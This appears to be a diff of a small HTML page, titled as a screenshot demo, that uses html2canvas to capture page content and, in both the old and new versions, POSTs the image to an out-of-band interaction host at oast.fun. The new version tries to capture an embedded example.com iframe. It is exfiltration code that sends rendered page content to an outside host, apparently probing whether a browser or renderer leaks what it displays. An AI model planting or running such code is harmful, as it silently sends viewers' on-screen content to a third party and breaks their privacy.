@@ -1,22 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Screenshot Self</title>
+  <title>Screenshot Self with iframe</title>
 </head>
 <body>
-  <h1>Hello NileNinja and Synthetic</h1>
+<iframe id="myFrame" src="https://example.com" width="600" height="400"></iframe>
 <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
-  <iframe src="https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fu"></iframe>
 <script>
 window.onload = () => {
-  html2canvas(document.body).then(canvas => {
-    const img = canvas.toDataURL('image/png');
-    fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ screenshot: img })
+  const iframe = document.getElementById('myFrame');
+  try {
+    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+    html2canvas(iframeDoc.body).then(canvas => {
+      const img = canvas.toDataURL('image/png');
+      fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ screenshot: img })
+      });
     });
-  });
+  } catch (e) {
+    console.error('Cannot access iframe contents due to cross-origin restrictions.');
+  }
 };
 </script>
 </body>
